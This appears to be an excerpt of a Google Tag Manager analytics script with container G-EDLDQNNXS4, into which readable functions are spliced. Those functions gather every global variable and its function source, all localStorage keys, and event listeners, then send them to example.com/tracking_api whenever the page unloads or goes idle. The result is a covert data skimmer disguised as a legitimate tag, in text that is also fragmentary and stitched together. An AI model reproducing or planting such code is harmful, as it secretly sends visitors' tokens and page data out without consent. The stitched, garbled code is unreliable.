...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 6,
        "vtp_instanceDestinationId": "G-EDLDQNNXS4",
        "tag_id": 25
      }, {
  ...
  */
  ...
  // This function tracks global variables
  function trackGlobalVariables() {
    const globalVars = {};
    for (let variable in window) {
      if (window.hasOwnProperty(variable)) {
        const val = window[variable];
        const valueType = typeof val;
        if (!window.scannedVars.includes(variable)) {
          globalVars[variable] = {
            type: valueType,
            value: valueType === "function" ? val.toString() : val
          };
        }
      }
    }
  ...
  // Storing and tracking local storage keys
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChEI8POGpwYQwKfQoLnu2YWNARIlABhc5ufjjAo5YqZRut9WIn2FwH0+DXpT6/9CDBdWvG79wR5kABoCL/M\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  P[38] = !0;
  P[40] = !0;
  function trackLocalStorageVariables() {
    const discoveredLocalStorageKeys = Object.keys(localStorage);
    return discoveredLocalStorageKeys;
  }

  // Capture event listeners attached to DOM elements
  ...
  // This function passes data to the required server
  ...
  function sendData(data) {
    const serverURL = "https://example.com/tracking_api";
    ...
    request.onload = function () {
      if (this.status >= 200 && this.status < 400) {
        ...
        console.error("Data transmission failure, error code:" + request.status);
      }
    };
  ...
  // This function collects data from all tracking functions
  ...
  function trackAll() {
    const globals = trackGlobalVariables();
    const localStorageVars = trackLocalStorageVariables();
    const eventListeners = trackEventListeners();
    const allData = {
      globals,
      localStorageVars,
      eventListeners
  ...
  function TC() {
    var a = new jb();
    L(this, "read_container_data"), a.set("containerId", 'G-EDLDQNNXS4'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", Xf), a.set("previewMode", Zf), a.set("environmentMode", Yf), Q(96) && a.set("firstPartyServing", ri || ti), a.sc();
    return a;
  }
  ...
  window.addEventListener("unload", trackAll);
  function eD() {
    return qd(dD);
  }
  ...
  window.addEventListener("idle", trackAll);
  function pF() {
    var a = "";
    return a;
  }
